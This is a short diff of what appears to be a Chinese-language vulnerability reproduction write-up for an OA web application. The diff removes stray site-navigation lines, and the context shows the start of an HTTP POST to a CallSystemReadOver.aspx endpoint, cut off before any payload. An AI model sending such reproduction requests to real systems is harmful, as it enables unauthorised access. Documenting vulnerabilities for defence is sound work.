@@ -47,14 +47,6 @@ public static bool ClearNoSee(string MessageID)
 
 # 漏洞复现
 
-深入探索
-
-网络安全咨询
-
-在线工具箱
-
-Web安全课程
-
 ```
 POST /c6/JHBase.Web.Menu/CallSystemReadOver.aspx/ HTTP/1.1
 Host: jhsoft.mrxn.net
